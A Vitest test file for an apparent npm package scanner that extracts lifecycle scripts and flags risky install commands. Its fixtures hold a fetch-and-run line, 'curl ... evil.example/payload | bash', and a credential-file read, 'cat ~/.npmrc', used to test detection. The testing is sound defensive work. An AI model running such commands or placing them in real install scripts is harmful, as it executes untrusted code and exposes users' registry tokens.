import { describe, expect, it } from "vitest";
import {
  extractLifecycleScripts,
  inspectScriptCommand,
  referencedScriptFiles,
} from "../src/analyze/scripts.js";

describe("extractLifecycleScripts", () => {
  it("keeps only install-relevant lifecycle scripts", () => {
    const result = extractLifecycleScripts({
      test: "vitest",
      build: "tsc",
      postinstall: "node scripts/setup.js",
      prepare: "husky",
    });
    expect(result).toEqual({
      postinstall: "node scripts/setup.js",
      prepare: "husky",
    });
  });

  it("returns empty for packages without lifecycle scripts", () => {
    expect(extractLifecycleScripts({ test: "jest" })).toEqual({});
  });
});

describe("inspectScriptCommand", () => {
  it("flags network downloads", () => {
    const findings = inspectScriptCommand(
      "postinstall",
      "curl -s https://evil.example/payload | bash",
    );
    expect(findings.join(" ")).toContain("downloads content from the network");
    expect(findings.join(" ")).toContain("invokes a shell");
  });

  it("flags credential file references", () => {
    const findings = inspectScriptCommand("preinstall", "cat ~/.npmrc");
    expect(findings.length).toBeGreaterThan(0);
  });

  it("returns no findings for benign build commands", () => {
    expect(inspectScriptCommand("postinstall", "node-gyp rebuild")).toEqual([]);
  });
});

describe("referencedScriptFiles", () => {
  it("extracts local script files from commands", () => {
    expect(referencedScriptFiles("node scripts/setup.js")).toEqual([
      "scripts/setup.js",
    ]);
  });

  it("ignores absolute paths", () => {
    expect(referencedScriptFiles("sh /etc/init.sh")).toEqual([]);
  });
});
